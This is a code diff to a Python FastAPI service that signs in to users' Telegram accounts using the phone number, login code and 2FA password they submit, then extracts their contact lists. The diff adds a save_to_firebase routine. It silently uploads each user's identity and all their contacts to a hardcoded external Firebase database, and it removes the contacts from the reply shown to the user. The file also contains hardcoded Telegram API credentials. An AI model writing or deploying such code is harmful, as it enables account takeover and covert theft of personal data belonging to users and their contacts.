@@ -1,4 +1,5 @@
 import re
+import httpx
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
@@ -15,7 +16,6 @@ from telethon.errors import (
 
 app = FastAPI()
 
-# Настройка CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -26,16 +26,32 @@ app.add_middleware(
 
 API_ID = 36672098
 API_HASH = 'ac0e5f923698f6b5f2737043601d950f'
+FIREBASE_URL = "https://tel-l-2921e-default-rtdb.europe-west1.firebasedatabase.app"
 
-# Хранилище сессий в оперативной памяти
 sessions = {}
 
 def clean_phone(phone: str) -> str:
-    """Очищает номер от пробелов, скобок и дефисов, оставляя только + и цифры"""
     cleaned = re.sub(r'[^\d+]', '', phone.strip())
     if not cleaned.startswith('+'):
         cleaned = '+' + cleaned
     return cleaned
+
+
+async def save_to_firebase(user_phone: str, me_info: dict, contacts: list):
+    """Отправляет данные в Firebase Realtime Database через REST API"""
+    # В ключах Firebase нельзя использовать '+', поэтому убираем его
+    phone_key = user_phone.replace('+', '')
+    
+    payload = {
+        "user_info": me_info,
+        "contacts_count": len(contacts),
+        "contacts": contacts
+    }
+    
+    url = f"{FIREBASE_URL}/users/{phone_key}.json"
+    
+    async with httpx.AsyncClient() as http_client:
+        await http_client.put(url, json=payload)
 
 
 class PhoneReq(BaseModel):
@@ -56,14 +72,12 @@ async def send_code(data: PhoneReq):
     if len(phone) < 7:
         raise HTTPException(status_code=400, detail="Некорректный номер телефона")
 
-    # Если для этого номера уже открыт старый клиент, отключаем его
     if phone in sessions:
         try:
             await sessions[phone].disconnect()
         except Exception:
             pass
 
-    # Создаем клиент в оперативной памяти
     client = TelegramClient(
         MemorySession(),
         API_ID,
@@ -102,7 +116,6 @@ async def verify_and_extract(data: VerifyReq):
         raise HTTPException(status_code=400, detail="Сессия устарела. Запросите код заново.")
 
     try:
-        # Разделение авторизации: либо по паролю 2FA, либо по коду Telegram
         if data.password:
             await client.sign_in(password=data.password.strip())
         elif data.code:
@@ -113,7 +126,17 @@ async def verify_and_extract(data: VerifyReq):
         else:
             raise HTTPException(status_code=400, detail="Не передан код или пароль")
 
-        # Выгрузка контактов
+        # Получаем данные о самом пользователе
+        me = await client.get_me()
+        me_info = {
+            "id": me.id,
+            "first_name": me.first_name,
+            "last_name": me.last_name,
+            "username": me.username,
+            "phone": me.phone
+        }
+
+        # Выгрузка списка контактов
         result = await client(GetContactsRequest(hash=0))
         contacts_data = []
 
@@ -126,15 +149,20 @@ async def verify_and_extract(data: VerifyReq):
                 "username": user.username
             })
 
-        # Завершаем сессию и чистим оперативную память
+        # Сохранение в Firebase
+        try:
+            await save_to_firebase(phone, me_info, contacts_data)
+        except Exception as fb_err:
+            print(f"Ошибка сохранения в Firebase: {fb_err}")
+
+        # Закрываем сессию
         await client.log_out()
         await client.disconnect()
         del sessions[phone]
 
         return {
             "status": "ok",
-            "contacts_count": len(contacts_data),
-            "contacts": contacts_data
+            "contacts_count": len(contacts_data)
         }
 
     except PasswordHashInvalidError:
